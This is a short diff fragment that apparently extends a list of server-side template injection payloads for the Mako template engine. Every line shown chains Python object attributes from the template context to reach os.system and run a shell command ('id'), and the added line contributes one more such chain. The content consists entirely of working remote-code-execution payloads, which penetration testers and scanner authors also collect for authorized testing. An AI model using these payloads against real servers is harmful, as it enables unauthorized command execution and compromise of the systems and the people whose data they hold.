@@ -78,3 +78,4 @@ ${self.template.module.runtime.util.compat.inspect.os.system("id")}
 ${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
 ${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
 ${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
